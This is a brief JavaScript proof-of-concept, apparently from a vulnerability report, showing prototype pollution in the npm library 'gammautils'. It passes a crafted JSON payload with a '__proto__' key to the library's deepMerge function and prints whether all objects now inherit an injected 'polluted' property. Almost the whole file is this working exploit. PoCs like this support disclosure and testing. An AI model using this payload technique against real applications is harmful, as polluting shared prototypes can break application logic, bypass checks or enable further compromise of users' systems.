var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const gammautils = require('gammautils');
var payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
gammautils.object.deepMerge(obj, payload);
console.log({}.polluted);